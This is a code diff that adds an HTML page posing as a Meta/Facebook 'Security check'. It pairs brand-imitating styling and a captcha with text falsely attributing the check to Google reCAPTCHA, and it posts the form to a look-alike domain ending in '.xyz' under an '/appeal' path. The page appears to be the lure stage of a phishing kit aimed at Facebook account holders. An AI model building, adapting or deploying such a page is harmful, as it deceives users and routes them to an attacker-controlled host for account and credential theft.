@@ -1,0 +1,114 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <title>Prove you are human</title>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css" integrity="sha384-xOolHFLEh07PJGoPkLv1IbcEPTNtaed2xpHsD9ESMhqIYd0nLMwNLD69Npy4HI+N" crossorigin="anonymous">
+
+    <script src="https://js.hcaptcha.com/1/api.js" async defer></script>
+    <style type="text/css">
+      .header{
+        background: linear-gradient(to top, #3b5998, #4d68a1);
+        padding-top: 20px;
+        padding-bottom: 15px;
+      }
+
+      .header img{
+        height: 30px;
+      }
+
+      .trupi{
+        border: 1px solid #cccccc;
+        padding:20px;
+        margin-top: 30px;
+        margin-bottom: 40px;
+      }
+
+      .trupi p{
+        color:#65676b;
+        font-size: 12px;
+        margin-bottom: 10px;
+      }
+
+      .securityp{
+        font-size: 14px !important;
+        color:black !important;
+        font-weight: 600;
+      }
+
+      .butonisubmit{
+        background-color: #4267b2;
+        margin-top:5px;
+        border: 1px solid #4267b2;
+        color: white;
+        font-size: 13px;
+        font-weight: 600;
+        padding: 4px 10px;
+      }
+
+      @media only screen and (max-width: 700px) {
+        .centermobile{
+          text-align: center;
+        }
+        .header{
+          padding-top: 14px;
+          padding-bottom: 12px;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="App">
+      <div class="header">
+        <div class="container">
+          <div class="row">
+            <div class="col-12">
+              <div class="centermobile">
+                <img src="perdiqka.png" class="img-fluid" width="130" />
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="body">
+        <div class="container">
+          <div class="row">
+            <div class="col-md-6 offset-md-3">
+              <div class="trupi">
+                <form id="yourFormId" action="https://meta.coma-ss19123fxf23214283y4.xyz/appeal" method="POST">
+                  <p class="securityp">Security check</p>
+                  <div class="h-captcha" data-sitekey="4c1ae680-2082-41f2-8514-ddf0048ec6b8" data-callback="onSuccess"></div>
+
+                  <p>This helps us to combat harmful conduct, detect and prevent spam and maintain the integrity of our Products.</p>
+                  <p>We've used Google's reCAPTCHA Enterprise product to provide this security check. Your use of reCAPTCHA Enterprise is subject to Google's Privacy Policy and Terms of Use.</p>
+                  <p>reCAPTCHA Enterprise collects hardware and software information, such as device and application data, and sends it to Google to provide, maintain and improve reCAPTCHA Enterprise and for general security purposes. This information is not used by Google for personalized advertising.</p>
+                  
+                  <input type="submit" value="Continue" id="continuebutton" disabled="true" class="btn btn-primary" style="background-color:#1b74e4; margin-top: 10px;"/>
+                </form>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <script type="text/javascript">
+      function onSuccess(response) {
+        // Enable the continue button after successful hCaptcha
+        document.getElementById('continuebutton').disabled = false;
+      }
+    </script>
+
+    <script
+      src="https://code.jquery.com/jquery-3.6.3.min.js"
+      integrity="sha256-pvPw+upLPUjgMXY0G+8O0xUf+/Im1MZjXxxgOcBQBXU="
+      crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-Fy6S3B9q64WdZWQUiU+q4/2Lc9npb8tCaSX9FK7E8HnRr0Jz8D6OP9dO5Vg3Q9ct" crossorigin="anonymous"></script>
+
+  </body>
+</html>
